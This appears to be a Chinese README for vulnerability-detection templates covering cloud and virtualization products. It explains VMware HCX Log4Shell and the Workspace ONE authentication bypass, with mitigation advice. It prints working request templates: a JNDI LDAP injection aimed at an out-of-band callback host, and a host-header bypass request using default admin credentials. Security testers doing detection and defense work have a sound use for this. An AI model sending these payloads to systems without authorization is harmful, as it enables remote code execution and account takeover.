# 云平台与虚拟化安全模板分类说明

本目录聚焦于主流云平台与虚拟化产品（如 VMware、vRealize、Workspace ONE 等）的安全风险，涵盖未授权访问、远程代码执行、认证绕过等典型漏洞，帮助安全测试人员快速定位和验证相关风险。

---

## 分类说明

- **VMware 产品线**：如 Workspace ONE Access、Identity Manager、vRealize Automation、HCX 等，常见风险包括认证绕过、远程代码执行、信息泄露等。
- **其他云平台与虚拟化**：如 OpenStack、Xen、KVM 等，风险点多为接口未授权、配置不当、敏感信息泄露等。

---

## 典型漏洞模板举例

### 1. VMware HCX Log4j 远程代码执行漏洞（CVE-2021-44228）

**模板文件**：`vmware-hcx-log4j.yaml`

#### 漏洞简介

VMware HCX 集成了受影响版本的 Apache Log4j 组件，存在 JNDI 注入导致远程代码执行（Log4Shell，CVE-2021-44228）风险。攻击者可通过构造恶意请求，在无需认证的情况下远程执行任意命令，获取敏感信息或控制系统。

#### 漏洞原理

Log4j 在处理日志消息时，如果日志内容中包含 `${jndi:ldap://...}` 这样的字符串，会自动发起远程请求并加载恶意类，导致远程代码执行。此模板通过在登录接口的 `username` 字段注入 JNDI payload，若目标存在漏洞，将触发对攻击者控制的服务器的 DNS 或 LDAP 请求。

#### 检测逻辑（YAML内容解析）

```yaml
id: vmware-hcx-log4j

http:
  - raw:
      - |
        @timeout: 10s
        POST /hybridity/api/sessions HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
        Content-Type: application/json
        Origin: {{BaseURL}}

        {
          "authType": "password",
          "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}",
          "password": "admin"
        }

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: regex
        part: interactsh_request
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
```

- 发送带有 JNDI payload 的 POST 请求到 `/hybridity/api/sessions`。
- 通过 OOB（如 interactsh）检测是否有 DNS/LDAP 请求回连，判定目标存在该漏洞。

#### 防护建议

- 升级 VMware HCX 及其依赖的 Log4j 组件至官方修复版本。
- 禁用 Log4j 的 JNDI 功能，或限制其加载远程类的能力。
- 对所有用户输入进行严格校验，避免日志记录敏感或可控内容。

---

### 2. VMware Workspace ONE Access/Identity Manager/vRealize Automation 认证绕过漏洞（CVE-2022-22972）

**模板文件**：`CVE-2022-22972.yaml`

#### 漏洞简介

VMware Workspace ONE Access、Identity Manager 和 vRealize Automation 存在认证绕过漏洞。攻击者可通过特定请求，绕过正常认证流程，直接获取管理员权限，危害极大。

#### 漏洞原理

该漏洞影响本地域用户，攻击者可通过构造特定的 GET 和 POST 请求，利用认证流程中的逻辑缺陷，绕过身份验证，获取系统访问权限。部分请求还可触发与攻击者交互的 OAST（Out-Of-Band Application Security Testing）检测。

#### 检测逻辑（YAML内容解析）

```yaml
id: CVE-2022-22972

http:
  - raw:
      - |
        GET /vcac/ HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /vcac/?original_uri={{RootURL}}%2Fvcac HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /SAAS/auth/login/embeddedauthbroker/callback HTTP/1.1
        Host: {{interactsh-url}}
        Content-type: application/x-www-form-urlencoded

        protected_state={{protected_state}}&userstore={{userstore}}&username=administrator&password=horizon&userstoreDisplay={{userstoreDisplay}}&horizonRelayState={{horizonRelayState}}&stickyConnectorId={{stickyConnectorId}}&action=Sign+in

    host-redirects: true
    max-redirects: 3

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "HZN="
      - type: word
        part: interactsh_protocol
        words:
          - "http"
      - type: status
        status:
          - 302

    extractors:
      - type: regex
        name: protected_state
        group: 1
        regex:
          - 'id="protected_state" value="([a-zA-Z0-9]+)"\/>'
        internal: true
        part: body
      # 其他参数提取同理
```

- 依次发起 GET 和 POST 请求，尝试绕过认证。
- 检查响应头、状态码和 OAST 回连，判定是否存在认证绕过。

#### 防护建议

- 立即升级 VMware Workspace ONE Access、Identity Manager 和 vRealize Automation 至官方修复版本。
- 加强认证流程校验，避免逻辑绕过。
- 限制管理接口的网络暴露，仅允许可信网络访问。

---